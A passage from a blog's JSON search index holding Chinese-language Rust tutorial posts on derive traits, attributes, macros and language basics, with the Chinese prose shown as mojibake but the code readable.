r#tryã€‚æœ‰å…³ç‰ˆæœ¬çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚è§é™„å½• E.","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Rust","slug":"æŠ€æœ¯å‘/Rust","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Rust/"}],"tags":[{"name":"rust","slug":"rust","permalink":"https://www.sizaif.com/tags/rust/"}],"author":"sizaif"},{"title":"Rustå­¦ä¹ 3-æ´¾ç”Ÿ-Derive","slug":"rustå­¦ä¹ 3-æ´¾ç”Ÿ-derive","date":"2022-02-21T09:31:45.000Z","updated":"2022-02-21T09:37:24.261Z","comments":true,"path":"posts/d76d00f/","link":"","permalink":"https://www.sizaif.com/posts/d76d00f/","excerpt":"","text":"æ´¾ç”Ÿ é€šè¿‡ #[derive] å±æ€§ï¼Œç¼–è¯‘å™¨èƒ½å¤Ÿæä¾›æŸäº› trait çš„åŸºæœ¬å®ç°ã€‚å¦‚æœéœ€è¦æ›´å¤æ‚çš„è¡Œä¸ºï¼Œè¿™äº› trait ä¹Ÿå¯ä»¥æ‰‹åŠ¨å®ç°ã€‚ ä¸‹é¢æ˜¯å¯ä»¥è‡ªåŠ¨æ´¾ç”Ÿçš„ traitï¼š æ¯”è¾ƒ trait: Eq, PartialEq, Ord, PartialOrd Eqï¼šå®Œå…¨ç­‰ä»·å…³ç³» PartialEqï¼š éƒ¨åˆ†ç­‰ä»·å…³ç³» Ordï¼šå…¨åºå…³ç³» PartialOrdï¼šæ¯”è¾ƒæ’åºé¡ºåºçš„å€¼ Clone, ç”¨æ¥ä» &amp;T åˆ›å»ºå‰¯æœ¬ Tã€‚ Copyï¼Œä½¿ç±»å‹å…·æœ‰ â€œå¤åˆ¶è¯­ä¹‰â€ï¼ˆcopy semanticsï¼‰è€Œé â€œç§»åŠ¨è¯­ä¹‰â€ï¼ˆmove semanticsï¼‰ã€‚ Hashï¼Œä» &amp;T è®¡ç®—å“ˆå¸Œå€¼ï¼ˆhashï¼‰ã€‚ Default, åˆ›å»ºæ•°æ®ç±»å‹çš„ä¸€ä¸ªç©ºå®ä¾‹ã€‚ Debugï¼Œä½¿ç”¨ &#123;:?&#125; formatter æ¥æ ¼å¼åŒ–ä¸€ä¸ªå€¼ã€‚ // `Centimeters`ï¼Œå¯ä»¥æ¯”è¾ƒçš„å…ƒç»„ç»“æ„ä½“ #[derive(PartialEq, PartialOrd)] struct Centimeters(f64); // `Inches`ï¼Œå¯ä»¥æ‰“å°çš„å…ƒç»„ç»“æ„ä½“ #[derive(Debug)] struct Inches(i32); impl Inches &#123; fn to_centimeters(&amp;self) -> Centimeters &#123; let &amp;Inches(inches) = self; Centimeters(inches as f64 * 2.54) &#125; &#125; // `Seconds`ï¼Œä¸å¸¦é™„åŠ å±æ€§çš„å…ƒç»„ç»“æ„ä½“ struct Seconds(i32); fn main() &#123; let _one_second = Seconds(1); // æŠ¥é”™ï¼š`Seconds` ä¸èƒ½æ‰“å°ï¼›å®ƒæ²¡æœ‰å®ç° `Debug` trait //println!(\"One second looks like: &#123;:?&#125;\", _one_second); // è¯•ä¸€è¯• ^ å–æ¶ˆæ­¤è¡Œæ³¨é‡Š // æŠ¥é”™ï¼š`Seconds`ä¸èƒ½æ¯”è¾ƒï¼›å®ƒæ²¡æœ‰å®ç° `PartialEq` trait //let _this_is_true = (_one_second == _one_second); // è¯•ä¸€è¯• ^ å–æ¶ˆæ­¤è¡Œæ³¨é‡Š let foot = Inches(12); println!(\"One foot equals &#123;:?&#125;\", foot); let meter = Centimeters(100.0); let cmp = if foot.to_centimeters() &lt; meter &#123; \"smaller\" &#125; else &#123; \"bigger\" &#125;; println!(\"One foot is &#123;&#125; than one meter.\", cmp); &#125; å±æ€§ å±æ€§æ˜¯åº”ç”¨äºæŸäº›æ¨¡å—ã€crate æˆ–é¡¹çš„å…ƒæ•°æ®ï¼ˆmetadataï¼‰ã€‚è¿™å…ƒæ•°æ®å¯ä»¥ç”¨æ¥ï¼š æ¡ä»¶ç¼–è¯‘ä»£ç  è®¾ç½® crate åç§°ã€ç‰ˆæœ¬å’Œç±»å‹ï¼ˆäºŒè¿›åˆ¶æ–‡ä»¶æˆ–åº“ï¼‰ ç¦ç”¨ lint ï¼ˆè­¦å‘Šï¼‰ å¯ç”¨ç¼–è¯‘å™¨çš„ç‰¹æ€§ï¼ˆå®ã€å…¨å±€å¯¼å…¥ï¼ˆglob importï¼‰ç­‰ï¼‰ é“¾æ¥åˆ°ä¸€ä¸ªé Rust è¯­è¨€çš„åº“ æ ‡è®°å‡½æ•°ä½œä¸ºå•å…ƒæµ‹è¯• æ ‡è®°å‡½æ•°ä½œä¸ºåŸºå‡†æµ‹è¯•çš„æŸä¸ªéƒ¨åˆ† å½“å±æ€§ä½œç”¨äºæ•´ä¸ª crate æ—¶ï¼Œå®ƒä»¬çš„è¯­æ³•ä¸º #![crate_attribute]ï¼Œå½“å®ƒä»¬ç”¨äºæ¨¡å— æˆ–é¡¹æ—¶ï¼Œè¯­æ³•ä¸º #[item_attribute]ï¼ˆæ³¨æ„å°‘äº†æ„Ÿå¹å· !ï¼‰ã€‚ å±æ€§å¯ä»¥æ¥å—å‚æ•°ï¼Œæœ‰ä¸åŒçš„è¯­æ³•å½¢å¼ï¼š #[attribute = &quot;value&quot;] #[attribute(key = &quot;value&quot;)] #[attribute(value)] å±æ€§å¯ä»¥å¤šä¸ªå€¼ï¼Œå®ƒä»¬å¯ä»¥åˆ†å¼€åˆ°å¤šè¡Œä¸­ï¼š #[attribute(value, value2)] #[attribute(value, value2, value3, value4, value5)]","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Rust","slug":"æŠ€æœ¯å‘/Rust","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Rust/"}],"tags":[{"name":"rust","slug":"rust","permalink":"https://www.sizaif.com/tags/rust/"}],"author":"sizaif"},{"title":"Rustå­¦ä¹ 2-å®ä¸å…ƒç¼–ç¨‹","slug":"rustå­¦ä¹ 2-å®ä¸å…ƒç¼–ç¨‹","date":"2022-02-04T10:56:48.000Z","updated":"2022-02-04T10:58:08.000Z","comments":true,"path":"posts/7af06751/","link":"","permalink":"https://www.sizaif.com/posts/7af06751/","excerpt":"","text":"Rustå­¦ä¹ 2-å®ä¸å…ƒç¼–ç¨‹ 2022-02-04- [TOC] ä»€ä¹ˆæ˜¯å…ƒç¼–ç¨‹ å…ƒç¼–ç¨‹æ˜¯æŒ‡æŸç±»[è®¡ç®—æœºç¨‹åº]çš„ç¼–å†™ï¼Œè¿™ç±»è®¡ç®—æœºç¨‹åºç¼–å†™æˆ–è€…æ“çºµå…¶ä»–ç¨‹åº(æˆ–è€…è‡ªèº«)ä½œä¸ºå®ƒä»¬çš„æ•°æ®ï¼Œæˆ–è€…åœ¨[è¿è¡Œæ—¶]å®Œæˆéƒ¨åˆ†æœ¬åº”åœ¨[ç¼–è¯‘æ—¶]å®Œæˆçš„å·¥ä½œã€‚ å…ƒç¼–ç¨‹æ˜¯ç”¨æ¥äº§ç”Ÿä»£ç çš„ç¨‹åºï¼Œæ“çºµä»£ç çš„ç¨‹åºï¼Œåœ¨è¿è¡Œæ—¶åˆ›å»ºå’Œä¿®æ”¹ä»£ç è€Œéç¼–ç¨‹æ—¶ï¼Œè¿™ç§ç¨‹åºå«åšå…ƒç¨‹åºã€‚è€Œç¼–å†™è¿™ç§ç¨‹åºå°±å«åšå…ƒç¼–ç¨‹ã€‚ å…ƒç¼–ç¨‹æ˜¯ä¸€ç§ç¼–ç¨‹æŠ€æœ¯,ç¼–å†™èƒ½å¤Ÿç”Ÿäº§æ–°ä»£ç çš„ä»£ç ,æ ¹æ®è¯­è¨€çš„ä¸åŒ,å®ç°çš„æ–¹å¼æœ‰ä¸¤ç§: åœ¨è¿è¡Œæ—¶ç¼–è¯‘å’Œåœ¨ç¼–è¯‘æœŸ. è¿è¡Œæ—¶å…ƒç¼–ç¨‹å¯ç”¨äºåŠ¨æ€è¯­è¨€: ä¾‹å¦‚python,JavaScript,Lisp. ç¼–è¯‘å‹è¯­è¨€ä¸å¯èƒ½åœ¨è¿è¡Œæ—¶ç”ŸæˆæŒ‡ä»¤,æ‰§è¡Œç¨‹åºé¢„ç¼–è¯‘. Rustæä¾›ç¼–è¯‘æœŸä»£ç ç”ŸæˆåŠŸèƒ½, Rustå®ä¸ä¼šä»æ‰§è¡Œç¯å¢ƒä¸­æ•è·å˜é‡ Rustä¸­çš„å®åŠå…¶ç±»å‹ Rustå®æ—¶åœ¨æŠ½è±¡è¯­æ³•æ ‘æ„é€ çš„ç¬¬äºŒé˜¶æ®µç»“æŸæ—¶è§£æçš„, è¿›è¡Œåç§°è§£æçš„é˜¶æ®µ, åç§°è§£ææ—¶åœ¨ä½œç”¨åŸŸä¸­æŸ¥æ‰¾åœ¨è¡¨è¾¾å¼ä¸­å®šä¹‰çš„å˜é‡æ˜¯å¦å­˜åœ¨çš„é˜¶æ®µ. Rustå®èƒ½å¤Ÿè¯†åˆ«ä¸Šä¸‹æ–‡,å¹¶æ ¹æ®å®æ‰©å±•å“åº”çš„å†…å®¹, å¸¸è§çš„å®å°±æ˜¯println! , å…è®¸æˆ‘ä»¬å‘printlnå®ä¼ é€’å°½å¯èƒ½å¤šçš„å‚æ•°. Rustä¸æ”¯æŒä¼ é€’å‡½æ•°çš„å¯å˜å‚æ•°. println!(\"&#123;&#125;\", 1); // é»˜è®¤ç”¨æ³•,æ‰“å°Display println!(\"&#123;:o&#125;\", 9); // å…«è¿›åˆ¶ println!(\"&#123;:x&#125;\", 255); // åå…­è¿›åˆ¶ å°å†™ println!(\"&#123;:X&#125;\", 255); // åå…­è¿›åˆ¶ å¤§å†™ println!(\"&#123;:p&#125;\", &amp;0); // æŒ‡é’ˆ println!(\"&#123;:b&#125;\", 15); // äºŒè¿›åˆ¶ println!(\"&#123;:e&#125;\", 10000f32); // ç§‘å­¦è®¡æ•°(å°å†™) println!(\"&#123;:E&#125;\", 10000f32); // ç§‘å­¦è®¡æ•°(å¤§å†™) println!(\"&#123;:?&#125;\", \"test\"); // æ‰“å°Debug println!(\"&#123;:#?&#125;\", (\"test1\", \"test2\")); // å¸¦æ¢è¡Œå’Œç¼©è¿›çš„Debugæ‰“å° è¾“å‡ºéåŸºæœ¬ç±»å‹çš„ç±»JSONæ ¼å¼çš„å€¼ println!(\"&#123;a&#125; &#123;b&#125; &#123;b&#125;\", a = \"x\", b = \"y\"); // å‘½åå‚æ•° å®çš„ç±»å‹ å£°æ˜å®ï¼ˆDeclarative Macroï¼‰ ä½¿ç”¨macro_rules!å®åˆ›å»º è¿‡ç¨‹å®ï¼ˆProcedural Macroï¼‰ æ›´é«˜çº§å½¢å¼,å®Œå…¨æ§åˆ¶ä»£ç çš„æ“ä½œå’Œç”Ÿæˆ. å£°æ˜å®ï¼ˆDeclarative Macroï¼‰å’Œè¿‡ç¨‹å®ï¼ˆProcedural Macroï¼‰ã€‚å‰è€…æŒ‡çš„æ˜¯ç”¨æŸç§è¯­æ³•ç›´æ¥å£°æ˜å‡ºçš„å®ã€‚åè€…æ˜¯å¯¹åº”ç›´æ¥ç”ŸæˆæŠ½è±¡è¯­æ³•æ ‘çš„è¿‡ç¨‹çš„å®ã€‚ç›´è§‰ä¸Šè¿‡ç¨‹å®æ›´éšå¼ï¼Œæ›´å…¨èƒ½ï¼›å£°æ˜å®æ›´å¯è¯»ï¼Œæ›´ç›´æ¥ã€‚ ç¼–å†™ä¸€ä¸ªå£°æ˜å®,å®ä¾‹: use std::io; // å®šä¹‰ä¸€ä¸ªè¾“å…¥å® macro_rules! scanline &#123; ($x:expr) => &#123; io::stdin().read_line(&amp;mut $x).unwrap(); &#125;; &#125; fn main() &#123; let mut input = String::new(); scanline!(input); println!(\" read &#123;:?&#125;\",input); &#125; è¿‡ç¨‹å®(Procedural Macroï¼‰: è‡ªå®šä¹‰ #[derive] å®åœ¨ç»“æ„ä½“å’Œæšä¸¾ä¸ŠæŒ‡å®šé€šè¿‡ derive å±æ€§æ·»åŠ çš„ä»£ç ,åœ¨å‡½æ•°ä¸Šä½¿ç”¨#[proc_macro_derive]å±æ€§, ç±»å±æ€§ï¼ˆAttribute-likeï¼‰å®å®šä¹‰å¯ç”¨äºä»»æ„é¡¹çš„è‡ªå®šä¹‰å±æ€§, åœ¨å‡½æ•°ä¸Šä½¿ç”¨#[proc_macro_attribute]å±æ€§, ç±»å‡½æ•°å®çœ‹èµ·æ¥åƒå‡½æ•°ä¸è¿‡ä½œç”¨äºä½œä¸ºå‚æ•°ä¼ é€’çš„ token, åœ¨å‡½æ•°ä¸Šä½¿ç”¨#[proc_macro]å±æ€§, æ ‡å‡†åº“ä¸­çš„å†…ç½®å® dbg!: å…è®¸ä½¿ç”¨ä»–ä»¬çš„å€¼è¾“å‡ºè¡¨è¾¾å¼çš„å€¼ compile_error!: åœ¨ç¼–è¯‘æœŸä»ä»£ç ä¸­æŠ¥å‘Šé”™è¯¯. concat! é“¾æ¥ä¼ é€’ç»™å®ƒçš„ä»»æ„æ•°é‡çš„æ–‡å­—, å¹¶å°†é“¾æ¥çš„æ–‡å­—ä½œä¸º&amp;'static strè¿”å› env!: æ£€æŸ¥ç¼–è¯‘æœŸçš„ç¯å¢ƒå˜é‡, å®‰å…¨ç‰ˆæœ¬çš„å®ä¸º : option_env! eprint!å’Œeprintln! ä¸println!ç±»å‹, å°†æ¶ˆæ¯è¾“å‡ºåˆ°æ ‡å‡†å¼‚å¸¸æµä¸­ include_bytes!: ä½œä¸ºä¸€ç§å°†æ–‡ä»¶è¯»å–ä¸ºå­—èŠ‚æ•°ç»„çš„å¿«æ·æ–¹å¼, stringify!: è·å¾—ç±»å‹æˆ–æ ‡è®°ä½œä¸ºå­—ç¬¦ä¸²çš„å­—é¢è½¬æ¢ vec!: vector","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Rust","slug":"æŠ€æœ¯å‘/Rust","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Rust/"}],"tags":[{"name":"rust","slug":"rust","permalink":"https://www.sizaif.com/tags/rust/"}],"author":"sizaif"},{"title":"Rustå­¦ä¹ 1-å…¥é—¨","slug":"rustå­¦ä¹ 1-å…¥é—¨","date":"2022-02-03T09:25:08.000Z","updated":"2022-04-10T09:01:11.017Z","comments":true,"path":"posts/dba35a1e/","link":"","permalink":"https://www.sizaif.com/posts/dba35a1e/","excerpt":"","text":"Rustå­¦ä¹ 1-å…¥é—¨ å®‰è£…Rust &amp;VScodeé›†æˆRust ç›®æ ‡: windows ç¯å¢ƒä¸‹ä½¿ç”¨VScode IDE è¿›è¡Œrustç¼–å†™å’Œæµ‹è¯•è¿è¡Œ VScodeé›†æˆrust windows å®‰è£…Rust It looks like youâ€™re running Windows. To start using Rust, download the installer, then run the program and follow the onscreen instructions. You may need to install the Visual Studio C++ Build tools when prompted to do so. If you are not on Windows see â€œOther Installation Methodsâ€. å®‰è£… Visual Studio 2019 çš„æ„å»ºå·¥å…· https://visualstudio.microsoft.com/visual-cpp-build-tools/ è¯­è¨€åŒ…: é€‰æ‹©ä¸­æ–‡å’Œè‹±æ–‡ å®‰è£…rust https://www.rust-lang.org/tools/install é€‰æ‹©64ä½ é»˜è®¤å®‰è£…å³å¯ æµ‹è¯•æ˜¯å¦å®‰è£…æˆåŠŸ: $ cargo --version cargo 1.58.0 (f01b232bc 2022-01-19) VSCodeé›†æˆrust å®‰è£…Rust and Friends é›†æˆåŒ… é›†æˆåŒ…ä¸­åŒ…æ‹¬: rust-analyzer ä½¿ç”¨rust-analyzer è¿›è¡Œç¼–è¯‘è¿è¡Œ Rustè¯­è¨€ åŸºå…ƒç±»å‹ bool,char æ•´å‹ æœ€å¤§æ”¯æŒ128ä½ æœ‰ç¬¦å· æ— ç¬¦å· i8 u8 i16 u16 i32 u32 i64 u64 i126 u128 isize å°ºå¯¸å¯å˜çš„æœ‰ç¬¦å·æ•´å‹ usize å°ºå¯¸å¯å˜çš„æ— ç¬¦å·æ•´å‹ f32 32ä½æµ®ç‚¹æ•° f64 64ä½æµ®ç‚¹æ•° [T,N] å›ºå®šå¤§å°çš„æ•°ç»„, Tå…ƒç´ ç±»å‹,Næ•°ç»„å¤§å° [T] åŠ¨æ€å¤§å°çš„è¿ç»­åºåˆ—çš„è§†å›¾,Tä»»æ„ç±»å‹ str å­—ç¬¦ä¸²åˆ‡ç‰‡,ä¸»è¦åšå¼•ç”¨, å³&amp;str (T,U,â€¦) æœ‰é™åºåˆ—,T,Uä¸ºä¸åŒç±»å‹ fn(i32) -&gt; i32 æ¥å—i32ç±»å‹å‚æ•°å¹¶è¿”å›i32ç±»å‹å‚æ•°çš„å‡½æ•° å˜é‡å£°æ˜å’Œä¸å¯å˜æ€§ ä½¿ç”¨å…³é”®å­—letå£°æ˜å˜é‡, å˜é‡åˆå§‹,æ— æ³•åˆ†é…å…¶ä»–å€¼,è‹¥è¦ä¿®æ”¹,åˆ™å‰é¢æ·»åŠ mutå…³é”®å­— fn main() &#123; let a = 1; let mut b = 2; a = 3; b = 4; print!(\"&#123;&#125;,&#123;&#125;\",a,b); &#125; æŠ¥é”™. å‡½æ•° å‡½æ•°è¡¨ç¤º: fn (u64,u64) ->u64 é—­åŒ… ç®€å•é—­åŒ…, é€šè¿‡aæ¥è°ƒç”¨, ||å†…å­˜æ”¾å‚æ•° let a = ||(); å®ä¾‹: fn main() &#123; let double = |x| x*2; let value = 5; let twice = double(value); let big_c = |b,c| &#123; let z = b+c; z * twice &#125;; let some = big_c(1,2); print!(\"&#123;&#125;\",some); &#125; Running `target\\debug\\helloworld.exe` 30 å­—ç¬¦ä¸² &amp;str, String ä¸¤ç§ç±»å‹, ä¿è¯å­—ç¬¦ä¸²ä¸ºæœ‰æ•ˆçš„UTF-8 æ¡ä»¶å’Œåˆ¤æ–­ ç±»ä¼¼ C++ if-else ä½†Rustçš„if-else ä¸æ˜¯è¯­å¥,è€Œæ˜¯ä¸€ä¸ªè¡¨è¾¾å¼,è¡¨è¾¾å¼ä¼šè¿”å›å€¼ èŠ±æ‹¬å·æœ€åä¸€è¡Œæˆä¸ºè¡¨è¾¾å¼çš„è¿”å›å€¼, if-elseåˆ†æ”¯åº”å…·æœ‰ç›¸åŒçš„è¿”å›ç±»å‹ match è¡¨è¾¾å¼ ç±»ä¼¼äºcè¯­è¨€switchè¯­å¥ fn main()&#123; math a &#123; b => println(\"b\"), c => println(\"c\"), other =>&#123; xxxx; &#125; &#125; &#125; å¾ªç¯ loop,while,for loop æ— é™å¾ªç¯ break è·³å‡º rustä¸­çš„for å¾ªç¯åªé€‚ç”¨ç”¨å¯ä»¥è½¬æ¢ä¸ºè¿­ä»£å™¨çš„ç±»å‹ for i in 0..10&#123; println!(\"&#123;&#125;\",i); &#125; // 0..10 0-10 ä¸åŒ…æ‹¬10 // 0..=10 0-10 åŒ…æ‹¬10 ç»“æ„ä½“ Rustç»“æ„ä½“ç±»ä¼¼Cè¯­è¨€ç»“æ„ä½“ Rust ä¸­çš„ç»“æ„ä½“ï¼ˆStructï¼‰ä¸å…ƒç»„ï¼ˆTupleï¼‰éƒ½å¯ä»¥å°†è‹¥å¹²ä¸ªç±»å‹ä¸ä¸€å®šç›¸åŒçš„æ•°æ®æ†ç»‘åœ¨ä¸€èµ·å½¢æˆæ•´ä½“ï¼Œä½†ç»“æ„ä½“çš„æ¯ä¸ªæˆå‘˜å’Œå…¶æœ¬èº«éƒ½æœ‰ä¸€ä¸ªåå­—ï¼Œè¿™æ ·è®¿é—®å®ƒæˆå‘˜çš„æ—¶å€™å°±ä¸ç”¨è®°ä½ä¸‹æ ‡äº†ã€‚å…ƒç»„å¸¸ç”¨äºéå®šä¹‰çš„å¤šå€¼ä¼ é€’ï¼Œè€Œç»“æ„ä½“ç”¨äºè§„èŒƒå¸¸ç”¨çš„æ•°æ®ç»“æ„ã€‚ç»“æ„ä½“çš„æ¯ä¸ªæˆå‘˜å«åš&quot;å­—æ®µ&quot;ã€‚ è¿™æ˜¯ä¸€ä¸ªç»“æ„ä½“å®šä¹‰ï¼š struct Site &#123; domain: String, name: String, nation: String, found: u32 &#125; æ³¨æ„ï¼šå¦‚æœä½ å¸¸ç”¨ C/C++ï¼Œè¯·è®°ä½åœ¨ Rust é‡Œ struct è¯­å¥ä»…ç”¨æ¥å®šä¹‰ï¼Œä¸èƒ½å£°æ˜å®ä¾‹ï¼Œç»“å°¾ä¸éœ€è¦ ; ç¬¦å·ï¼Œè€Œä¸”æ¯ä¸ªå­—æ®µå®šä¹‰ä¹‹åç”¨ , åˆ†éš”ã€‚ æœ‰ä¸€ç§æ›´ç®€å•çš„å®šä¹‰å’Œä½¿ç”¨ç»“æ„ä½“çš„æ–¹å¼ï¼šå…ƒç»„ç»“æ„ä½“ã€‚ å…ƒç»„ç»“æ„ä½“æ˜¯ä¸€ç§å½¢å¼æ˜¯å…ƒç»„çš„ç»“æ„ä½“ã€‚ ä¸å…ƒç»„çš„åŒºåˆ«æ˜¯å®ƒæœ‰åå­—å’Œå›ºå®šçš„ç±»å‹æ ¼å¼ã€‚å®ƒå­˜åœ¨çš„æ„ä¹‰æ˜¯ä¸ºäº†å¤„ç†é‚£äº›éœ€è¦å®šä¹‰ç±»å‹ï¼ˆç»å¸¸ä½¿ç”¨ï¼‰åˆä¸æƒ³å¤ªå¤æ‚çš„ç®€å•æ•°æ®ï¼š struct Color(u8, u8, u8); struct Point(f64, f64); let black = Color(0, 0, 0); let origin = Point(0.0, 0.0); &quot;é¢œè‰²&quot;å’Œ&quot;ç‚¹åæ ‡&quot;æ˜¯å¸¸ç”¨çš„ä¸¤ç§æ•°æ®ç±»å‹ï¼Œä½†å¦‚æœå®ä¾‹åŒ–æ—¶å†™ä¸ªå¤§æ‹¬å·å†å†™ä¸Šä¸¤ä¸ªåå­—å°±ä¸ºäº†å¯è¯»æ€§ç‰ºç‰²äº†ä¾¿æ·æ€§ï¼ŒRust ä¸ä¼šé—ç•™è¿™ä¸ªé—®é¢˜ã€‚å…ƒç»„ç»“æ„ä½“å¯¹è±¡çš„ä½¿ç”¨æ–¹å¼å’Œå…ƒç»„ä¸€æ ·ï¼Œé€šè¿‡ . å’Œä¸‹æ ‡æ¥è¿›è¡Œè®¿é—®ï¼š fn main() &#123; struct Color(u8, u8, u8); struct Point(f64, f64); let black = Color(0, 0, 0); let origin = Point(0.0, 0.0); println!(\"black = (&#123;&#125;, &#123;&#125;, &#123;&#125;)\", black.0, black.1, black.2); println!(\"origin = (&#123;&#125;, &#123;&#125;)\", origin.0, origin.1); &#125; Rust è¯­è¨€ä¸æ˜¯é¢å‘å¯¹è±¡çš„ï¼Œä»å®ƒæ‰€æœ‰æƒæœºåˆ¶çš„åˆ›æ–°å¯ä»¥çœ‹å‡ºè¿™ä¸€ç‚¹ã€‚ä½†æ˜¯é¢å‘å¯¹è±¡çš„çè´µæ€æƒ³å¯ä»¥åœ¨ Rust å®ç°ã€‚ ç»“æ„ä½“æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°å¿…é¡»æ˜¯ &amp;selfï¼Œä¸éœ€å£°æ˜ç±»å‹ï¼Œå› ä¸º self ä¸æ˜¯ä¸€ç§é£æ ¼è€Œæ˜¯å…³é”®å­—ã€‚ struct Rectangle &#123; width: u32, height: u32, &#125; impl Rectangle &#123; fn output(&amp;self) -> u32&#123; println!(\"&#123;&#125;,\",self.width * self.height); self.height + self.width &#125; &#125; fn main() &#123; let rect1 = Rectangle &#123; width: 30, height: 50 &#125;; Rectangle::output(&amp;rect1); println!(\"rect.1è°ƒç”¨&#123;&#125;\",rect1.output()); &#125; --------------------- è¾“å‡º: 1500, 1500, rect.1è°ƒç”¨80 self è°ƒç”¨æ­¤æ–¹æ³•å,ä¸å…è®¸åç»­ä½¿ç”¨è¯¥ç±»å‹ &amp;self ç±»å‹å®ä¾‹çš„è¯»å–è®¿é—®æƒé™ &amp;mut self ç±»å‹å®ä¾‹çš„å¯å˜è®¿é—® module,import,use æ¨¡å— æ¯ä¸ªrustç¨‹åºéƒ½éœ€è¦rootæ¨¡å—, å¯æ‰§è¡Œæ–‡ä»¶,é€šå¸¸ä¸ºmain.rs, å¯¹äºç¨‹åºåº“,é€šå¸¸ä¸ºlib.rs æ¨¡å—å¯ä»¥åœ¨å…¶ä»–æ¨¡å—å†…éƒ¨å£°æ˜,ä¹Ÿå¯ä»¥ç»„ç»‡ä¸ºæ–‡ä»¶å’Œç›®å½• ä½¿ç”¨modå£°æ˜, ä½¿ç”¨useå¼•ç”¨ æ¨¡å—ä¸­å®šä¹‰çš„å…ƒç´ é»˜è®¤ä¸ºç§æœ‰çš„, ä½¿ç”¨pub å…¬å…±è®¿é—® Rust ä¸­æœ‰ä¸¤ç§ç®€å•çš„è®¿é—®æƒï¼šå…¬å…±ï¼ˆpublicï¼‰å’Œç§æœ‰ï¼ˆprivateï¼‰ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œå¦‚æœä¸åŠ ä¿®é¥°ç¬¦ï¼Œæ¨¡å—ä¸­çš„æˆå‘˜è®¿é—®æƒå°†æ˜¯ç§æœ‰çš„ã€‚ å¦‚æœæƒ³ä½¿ç”¨å…¬å…±æƒé™ï¼Œéœ€è¦ä½¿ç”¨ pub å…³é”®å­—ã€‚ å¯¹äºç§æœ‰çš„æ¨¡å—ï¼Œåªæœ‰åœ¨ä¸å…¶å¹³çº§çš„ä½ç½®æˆ–ä¸‹çº§çš„ä½ç½®æ‰èƒ½è®¿é—®ï¼Œä¸èƒ½ä»å…¶å¤–éƒ¨è®¿é—®ã€‚ use å…³é”®å­—èƒ½å¤Ÿå°†æ¨¡å—æ ‡è¯†ç¬¦å¼•å…¥å½“å‰ä½œç”¨åŸŸï¼š å½“å­˜åœ¨ä¸¤ä¸ªç›¸åŒçš„åç§°ï¼Œä¸”åŒæ ·éœ€è¦å¯¼å…¥ï¼Œå¯ä»¥ä½¿ç”¨ as å…³é”®å­—ä¸ºæ ‡è¯†ç¬¦æ·»åŠ åˆ«åï¼š mod nation &#123; pub mod government &#123; pub fn govern() &#123;&#125; &#125; pub fn govern() &#123;&#125; &#125; use crate::nation::government::govern; use crate::nation::govern as nation_govern; fn main() &#123; nation_govern(); govern(); &#125; use å…³é”®å­—å¯ä»¥ä¸ pub å…³é”®å­—é…åˆä½¿ç”¨ï¼š mod nation &#123; pub mod government &#123; pub fn govern() &#123;&#125; &#125; pub use government::govern; &#125; fn main() &#123; nation::govern(); &#125; æ•°ç»„,å…ƒç»„,é¡¹ç›®åˆ—è¡¨ æ•°ç»„å…·æœ‰å›ºå®šé•¿åº¦, å­˜å‚¨ç›¸åŒç±»å‹å…ƒç´ , æ•°ç»„å¤§å°å¿…é¡»æ˜¯usizeç¡®å®šå€¼,ä¸èƒ½æ˜¯å˜é‡ å…ƒç»„å¯ä»¥æ˜¯ä¸åŒç±»å‹, å…ƒç»„æ˜¯å¼‚æ„é›†åˆ, é¡¹ç›®åˆ—è¡¨: ç±»ä¼¼æ•°ç»„, ä½†å†…å®¹å’Œé•¿åº¦å¯ä»¥ä¸ç”¨äº‹å…ˆæŒ‡å®š; ä»å †ä¸Šåˆ†é…,ä½¿ç”¨Vec::new æ„é€ æˆ– å®vec![]åˆ›å»º let mut number_vec: Vec&lt;u8> = Vec::new(); number_vec.push(1); number_vec.push(2); let mut vec_with_macro = vec![1,2,3,4,6]; vec_with_macro.push(3); let _ = vec_with_macro.pop(); println!(\"number_vec :&#123;:?&#125;, vec_with_macro:&#123;:?&#125;\",number_vec,vec_with_macro); ----------- è¾“å‡º: number_vec :[1, 2], vec_with_macro:[1, 2, 3, 4, 6] HashMap é”®/å€¼ å¯¹ æ¥è‡ªstd::collections æ¨¡å— ä½¿ç”¨HashMap::new åˆ›å»º let mut fmap = HashMap::new(); fmap.insert(\"a\", 1); fmap.insert(\"b\", 2); fmap.insert(\"c\", 3); fmap.insert(\"d\", 4); for (k,v) in &amp;fmap&#123; println!(\" got &#123;&#125;,&#123;&#125;\",k,v); &#125; //fmap[\"a\"] = 11; é”™è¯¯è¯­æ³• fmap.insert(\"a\", 11); *fmap.get_mut(\"a\").unwrap() = 13; println!(\"fmap[\\\"a\\\"] : &#123;&#125;\",fmap[\"a\"]); ä¿®æ”¹å†…å®¹æ— æ³•ç›´æ¥ä½¿ç”¨fmap[&quot;a&quot;] = 11; è¿›è¡Œä¿®æ”¹ HashMap does not implement IndexMut, while Vec does. ä¿®æ”¹æ–¹æ³•: è‹¥fampå­˜åœ¨å…¶å€¼çš„è¯, ç›´æ¥ç”¨insertæ–¹æ³•ä¿®æ”¹ è‹¥ä¸ç¡®å®šå¯ä»¥ä½¿ç”¨: *fmap.get_mut(&quot;a&quot;).unwrap() = 13; 